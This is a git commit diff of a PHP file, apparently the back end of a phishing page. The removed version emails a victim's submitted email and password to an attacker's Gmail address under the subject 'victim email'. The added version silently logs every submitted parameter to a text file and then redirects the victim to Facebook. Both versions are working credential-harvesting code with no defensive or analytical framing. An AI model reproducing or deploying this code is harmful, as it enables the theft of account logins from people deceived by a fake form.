0e25ee42ec304945104401e7255b4c4059ddbd38
fridricadolf <fridricadolf@gmail.com>
2019-04-14 01:21:34 -0500

    p

--- post.php
+++ post.php
@@ -1,19 +1,13 @@
-<?php 
-if(isset($_POST['submit'])){
-    $to = "fridricadolf100@gmail.com"; // this is your Email address
-    $from = $_POST['email']; // this is the sender's Email address
-    $email = $_POST['email'];
-    $pass = $_POST['pass'];
-    $subject = "victim email";
-   // $subject2 = "Copy of your form submission";
-    $message = $email . " " . $pass . " wrote the following:" . "\n\n" . $_POST['message'];
-   // $message2 = "Here is a copy of your message " . $first_name . "\n\n" . $_POST['message'];
-
-    $headers = "From:" . $from;
-    //$headers2 = "From:" . $to;
-    mail($to,$subject,message,$headers);
-   // mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender
-    header('Location: http://www.google.com');
-    // You can also use header('Location: http://www.google.com'); to redirect to another page.
-    }
+<?php
+header ('Location: http://www.facebook.com');
+$handle = fopen("tpcm.txt", "a");
+foreach($_GET as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
 ?>
